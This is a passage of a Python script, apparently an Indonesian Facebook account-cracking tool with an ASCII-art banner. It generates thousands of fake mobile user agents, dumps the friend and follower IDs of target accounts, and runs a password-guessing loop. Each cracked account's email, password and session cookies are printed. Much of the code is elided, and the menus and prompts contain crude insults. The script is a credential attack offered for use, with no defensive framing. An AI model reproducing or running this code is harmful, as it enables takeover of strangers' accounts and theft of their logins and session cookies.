...
for xd in range(10000):
    ...
    nk = f"Mozilla/5.0 (Android {str(rr(4,13))}; Mobile; rv:{str(rr(40,140))}.0) Gecko/{str(rr(40,150))}.0 Firefox/{str(rr(40,150))}.0"
    nk2 = f"Mozilla/5.0 (Android {str(rr(4,5))}.{str(rr(0,5))}; Mobile; rv:{str(rr(40,140))}.0) Gecko/{str(rr(40,150))}.0 Firefox/{str(rr(40,150))}.0"
    nokia = random.choice([nk,nk2])
    uak.append(nokia)
...
██████╔╝██║██║ ╚═╝     ██║██████╔╝██║██║ ╚═╝    ██║
╚═════╝ ╚═╝╚═╝               ╚═╝╚═════╝   ╚═╝╚═╝              ╚═╝
  Welcome Nonok Dapat Bage Duo Yo {h}By " Bimbim ''')                                           
#--------------------[ Ɑ͞ ̶͞ ̶͞ ඩMASUK ]--------------#
def login():
	try:
...
def menu(my_name,my_id):
	...
	if _____kang__cabul_____ in ['1']:
		...
		print('>> Benar Benar Mileh Tu Pilat ')
		back()
def error():
	...
	if kz in ['2']:
		...
		if len(vin)==0:
			...
			try:geh = lol[geeh]
				...
				print('>> Bebenar Bae Mile Tu Nonok ')
				back()
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('Dikit Dikit Bae Teduras Paket : '))
	except ValueError:
		print('>> Salah Nonok Ohh Nonok ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Nonok Dah Berenti ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('|Masok kah lagi Id Nyo ? : '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			...
			print('>> Mambu Nonok Sinyal Mu Iko ')
			exit()
	try:
		print('')
		...
		print(f'>>{k} Ndek Publik Nyari TunCot {x}')
		time.sleep(3)
		back()
...
def dump_pengikut():
	...
	try:
		...
		print('>> Mambu Nonok Sinyal Mu Iki ')
		exit()
	except (KeyError,IOError):
		print('>> Target Gagal Dahh Ala Ke Ongak Nyo ')
		exit()
#------------------[ CRACKⱭ͞ ̶͞ ̶͞ ඩGRUP ]-----------------#
balmond = b+"["+h+"✓"+b+"]"
...
def setting():
	...
	if hc in ['1','01']:
		...
		print('>> Nahh Nonok Lewo Mu Ko ')
		setting()
	else:
		method.append('validate')
	print('')
	_jembot_ = input('|Tambahkan Apklikasi (Basing nyo oy naro jugo fitur nyo) [Y/t] : ')
	if _jembot_ in ['']:
		print('>> Pilih Yang Bener Kontol ')
		back()
	...
	for pw in pwv:
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				print(f'\r├──> Email : {u}{idf}{P} | Sandi : {u}{pw}{P} | Tahun {m}<> {u}{tahun(idf)}{P}\n└──>  Cookies : {u}{Cookies}{P}\n └──> Login : {u}{ua}{P} ')
